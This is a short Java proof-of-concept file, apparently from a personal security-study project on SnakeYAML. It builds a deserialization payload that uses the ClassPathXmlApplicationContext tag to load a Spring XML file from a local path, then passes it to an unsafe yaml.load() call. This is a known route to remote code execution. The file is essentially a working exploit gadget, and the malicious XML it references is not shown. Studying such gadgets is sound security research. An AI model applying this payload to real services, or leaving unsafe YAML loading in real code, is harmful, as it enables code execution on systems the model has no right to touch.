package com.idiot9.inner;

import org.yaml.snakeyaml.Yaml;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ClassXml {
    public static void main(String[] args) throws IOException {
        String filePath = "./poc/inner/spring.xml";
        Marshal.marshal(filePath, "spring.xml");
        loadXml();
    }

    public static void loadXml(){
        Yaml yaml = new Yaml();
        String poc = "!!org.springframework.context.support.ClassPathXmlApplicationContext [ \"file:///D:/BaiduSyncdisk/code/MyJavaSecStudy/SnakeYaml/spring.xml\" ]";
        yaml.load(poc);
    }
}
